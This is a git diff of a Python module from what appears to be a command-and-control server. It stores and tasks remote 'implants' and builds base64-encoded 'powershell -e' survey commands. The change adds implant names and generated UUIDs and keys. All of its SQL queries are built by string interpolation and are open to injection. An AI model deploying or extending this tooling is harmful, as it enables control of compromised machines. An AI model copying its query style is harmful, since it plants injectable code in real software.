@@ -1,20 +1,19 @@
 #!/usr/bin/python3
 
-from flask import Flask,render_template,request,redirect,url_for,flash,make_response
 import time
 from base64 import b64encode
 from base64 import b64decode
-import MySQLdb
-
+import uuid, string, random
 
 class Implant:
-    def __init__(self,UUID,implantkey,notes,c2,filter,consumer):
-        self.name=UUID
+    def __init__(self,UUID,implantkey,notes,c2,filter,consumer,implant_name):
+        self.UUID=UUID
         self.key=implantkey
         self.notes=notes
         self.c2=c2
         self.filter=filter
         self.consumer=consumer
+        self.name=implant_name
 
 class callback:
     def __init__(self, UUID, time, gateway):
@@ -111,9 +110,7 @@ def getTasks(connection, UUID, complete):
     taskList = []
     for task in taskDetails:
         taskList.append(Task(task[0], task[1], task[2], task[3], task[4]))
-    #print(taskList)
     cur.close()
-   
     return taskList
 
 def getImplant(connection, UUID):
@@ -122,7 +119,7 @@ def getImplant(connection, UUID):
     implantQuery = cur.execute(f"SELECT * FROM implants WHERE UUID='{UUID}'")
     implantQuery = cur.fetchall()
     cur.close()
-    theImplant = Implant(implantQuery[0][0], implantQuery[0][1], implantQuery[0][2], implantQuery[0][3], implantQuery[0][4], implantQuery[0][5])
+    theImplant = Implant(implantQuery[0][0], implantQuery[0][1], implantQuery[0][2], implantQuery[0][3], implantQuery[0][4], implantQuery[0][5], implantQuery[0][6])
     return theImplant
 
 def getImplantList(connection):
@@ -151,37 +148,34 @@ def getSurveyList(connection, UUID):
     cur.close()
     return surveyData
 
-def addImplant(connection, UUID, implantkey, notes, c2, filter, consumer):
-    """
-    Inserts a new implant record into the database.
+def addImplant(connection, name, notes, c2, filter, consumer):
 
-    Parameters:
-    - connection: The database connection object.
-    - UUID: The UUID of the implant.
-    - implantkey: The implant key.
-    - notes: Additional notes for the implant.
-    - c2: The command and control server for the implant.
-    - filter: The filter for the implant.
-    - consumer: The consumer of the implant.
 
-    Returns:
-    None
-    """
     try:
         cur = connection.cursor()
-        cur.execute(f"INSERT INTO implants (UUID, implantkey, notes, c2, filter, consumer) VALUES ('{UUID}', '{implantkey}', '{notes}', '{c2}', '{filter}', '{consumer}')")
+        cur.execute(f"SELECT COUNT(*) FROM implants WHERE implant_name = '{name}'")
+        if cur.fetchone()[0] > 0:
+            cur.close()
+            raise ValueError('The implant name already exists')
+        while True:
+            UUID = str(uuid.uuid4())
+            cur.execute(f"SELECT COUNT(*) FROM implants WHERE UUID = '{UUID}'")
+            if cur.fetchone()[0] == 0:
+                break
+        implantkey = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+        cur.execute(f"INSERT INTO implants (implant_name, UUID, implantkey, notes, c2, filter, consumer) VALUES ('{name}', '{UUID}', '{implantkey}', '{notes}', '{c2}', '{filter}', '{consumer}')")
         connection.commit()
         cur.close()
     except Exception as e:
-        raise ValueError('Propbable duplicate UUID or database error')    
+        raise ValueError(e)    
     return
 
-def addImplant(connection,UUID,implantkey,notes,c2,filter,consumer):
-    cur=connection.cursor()
-    cur.execute(f"INSERT INTO implants (UUID,implantkey,notes,c2,filter,consumer) VALUES ('{UUID}','{implantkey}','{notes}','{c2}','{filter}','{consumer}')")
-    connection.commit()
-    cur.close()
-    return
+#def addImplant(connection,UUID,implantkey,notes,c2,filter,consumer):
+#    cur=connection.cursor()
+#    cur.execute(f"INSERT INTO implants (UUID,implantkey,notes,c2,filter,consumer) VALUES ('{UUID}','{implantkey}','{notes}','{c2}','{filter}','{consumer}')")
+#    connection.commit()
+#    cur.close()
+#    return
 
 def addTask(connection,UUID,task,notes):
     connection.commit()
@@ -317,7 +311,6 @@ def generateSurvey(connection,UUID,options,notes):
     
     task = b64encode(task.encode('UTF-16LE')).decode('UTF-8')
     task = encodedtask = "powershell -e " + task
-    print(task)
     return(task)
 
 def base64Encode(data):
